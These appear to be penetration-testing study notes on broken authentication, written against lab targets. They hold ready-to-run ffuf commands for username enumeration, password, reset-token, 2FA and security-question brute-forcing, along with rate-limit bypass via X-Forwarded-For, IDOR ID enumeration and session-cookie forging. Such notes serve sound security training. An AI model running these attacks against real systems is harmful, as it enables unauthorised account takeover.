# Broken Authentication

## Categories of Authentication

- Knowledge: passwords, PINs, Answer to Security Question
- Ownership: ID cards, TOTP, Authenticator App, Security Token
- Inherence: Biometric authentication

## Brute-Force Attacks

- User Enumeration 
```bash
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```
- Brute-Forcing Passwords
```bash
grep '[[:upper:]]' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username or password"
```
- Brute-Forcing Password Reset Tokens (example based on weak 4 digit reset token sent via email)
```bash
seq -w 0 9999 > tokens.txt # -w pads numbers with prepending zeros
ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```
- Brute-Forcing 2FA Codes (example based on weak 4 digit TOTP token)
```bash
seq -w 0 9999 > tokens.txt
ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

## Bypassing Brute-Force Protection

- **Rate Limit**: X-Forwarded-For HTTP Header can be randomised
- **CAPTCHAs**: Look for CAPTCHA solution in HTML code

## Password Attacks

- **Default Credentials**
  - [CIRT.net](https://cirt.net/passwords/)
  - SecLists Default Credentials (SecLists\Passwords\Default-Credentials\)
  - [SCADA](https://github.com/scadastrangelove/SCADAPASS/tree/master)
- **Vulnerable Password Reset**
  - Guessable Security Questions (for example brute force [world cities](https://github.com/datasets/world-cities/blob/main/data/world-cities.csv))
  ```bash
  cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt # all world cities
  cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt # just german cities
  ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
  ```
  - Username Injection in Password Reset Request (check post parameters in http request)

## Authentication Bypasses

- Accessing the protected page directly
  - go directly to hidden page /admin.ph 
  - catch the response in burp
  - change status code from 302 to 200
- Manipulating HTTP Parameters to access protected pages
  - Log in as regular user dirrcts to /admin.php?user_id=183
  - guess or bruteforce id parameter
```bash
seq 1 1000 > user_ids.txt
ffuf -w user_ids.txt -u http://STMIP:STMPO/admin.php?user_id=FUZZ -fr "Could not load admin data."
```

## Session Attacks

- Brute-Forcing cookies with insufficient entropy
  - Capture multiple session tokens and compare for similarities
  - Session cookie maybe long but most of it is fixed with only a small amount changing with each user
  - Session cookies could also increment and not be random thus easy to enumerate passed/future session tokens
  - Tokens maybe encoded values of the logon information
  - Try decoding session tokens to see if no truly random
```bash
echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d
echo -n 'user=htb-stdnt;role=admin' | base64 # base64 encode
echo -n 'user=htb-stdnt;role=admin' | xxd -p # hex encode
```
- **[Session Fixation](https://owasp.org/www-community/attacks/Session_fixation)**
  - Attacker obtains valid session identifier
  - Attacker coerces victim to use this session identifier (social engineering)
  - Victim authenticates to the vulnerable web application
  - Attacker knows the victim's session identifier and can hijack their account
- **[Improper Session Timeout](https://owasp.org/www-community/Session_Timeout)**
  - Sessions should expire after an appropriate time interval
  - Session validity duration depends on the web application